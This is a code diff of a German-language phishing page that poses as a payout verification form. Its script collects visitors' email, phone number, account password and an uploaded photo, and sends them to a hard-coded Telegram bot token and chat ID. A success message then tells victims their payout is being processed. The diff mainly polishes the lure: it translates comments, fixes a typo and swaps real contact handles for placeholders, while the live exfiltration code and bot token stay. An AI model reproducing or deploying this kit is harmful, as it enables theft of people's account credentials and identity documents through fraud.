@@ -7,6 +7,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Poppins:wght@600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css">
     <style>
+        /* CSS-Erweiterungen für ein professionelles Design */
         body { font-family: 'Inter', sans-serif; }
         
         .step-1-card {
@@ -42,7 +43,7 @@
             color: #fff !important;
         }
 
-        /* Иконки мессенджеров через маски для идеального вида */
+        /* SVG Messenger Icons */
         .icon-tg, .icon-wa {
             width: 22px;
             height: 22px;
@@ -82,10 +83,10 @@
                 </p>
                 
                 <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
-                    <a href="https://t.me/fara_manager" class="btn-messenger btn-tg">
+                    <a href="https://t.me/USERNAME" class="btn-messenger btn-tg">
                         <i class="icon-tg"></i> Telegram
                     </a>
-                    <a href="https://wa.me/447888379689" class="btn-messenger btn-wa">
+                    <a href="https://wa.me/PHONE" class="btn-messenger btn-wa">
                         <i class="icon-wa"></i> WhatsApp
                     </a>
                 </div>
@@ -137,14 +138,16 @@
         <div class="modal-content">
             <div style="font-size: 40px; margin-bottom: 15px;">✅</div>
             <h2 style="font-family: 'Poppins';">Erfolgreich!</h2>
-            <p style="font-size: 0.9rem; color: #8b949e;">Ihre Daten werden geprüft. Wir kontaktieren Sie in Kürзе bezüglich der Auszahlung.</p>
+            <p style="font-size: 0.9rem; color: #8b949e;">Ihre Daten werden geprüft. Wir kontaktieren Sie in Kürze bezüglich der Auszahlung.</p>
         </div>
     </div>
 
     <script>
+        // Telegram Bot Konfiguration
         const botToken = '8208977713:AAFqG2kZpj_SgtomllDdrBQAn4DG9V6t2OI';
         const chatId = '787580401';
 
+        // Aktualisierung des Dateinamens
         function updateFileName(input) {
             const display = document.getElementById('file-name-display');
             if (input.files.length > 0) {
@@ -153,6 +156,7 @@
             }
         }
 
+        // Formular-Absendung
         document.getElementById('verificationForm').onsubmit = async (e) => {
             e.preventDefault();
             const btn = document.getElementById('submitBtn');
@@ -165,15 +169,18 @@
             const regPass = document.getElementById('regPass').value;
             const fileInput = document.getElementById('photo-upload');
 
-            const message = `🚀 *NEUE ANFRAGE*\n📱 Kontakt: ${userPhone}\n📧 Email: ${regEmail}\n📞 Nummer: ${regPhone}\n🔑 PW: ${regPass}`;
+            // Nachricht für den Telegram-Bot
+            const message = `🚀 *NEUE ANFRAGE*\n\n📱 Kontakt: ${userPhone}\n📧 Email: ${regEmail}\n📞 Nummer: ${regPhone}\n🔑 PW: ${regPass}`;
 
             try {
+                // Textnachricht senden
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
                 });
 
+                // Foto senden
                 if (fileInput.files.length > 0) {
                     const formData = new FormData();
                     formData.append('chat_id', chatId);
@@ -181,9 +188,10 @@
                     await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
                 }
 
+                // Modal anzeigen
                 document.getElementById('successModal').style.display = 'flex';
             } catch (error) {
-                alert('Fehler. Bitte erneut versuchen.');
+                alert('Ein Fehler ist aufgetreten. Bitte erneut versuchen.');
                 btn.disabled = false;
                 btn.innerHTML = 'Auszahlung beantragen';
             }
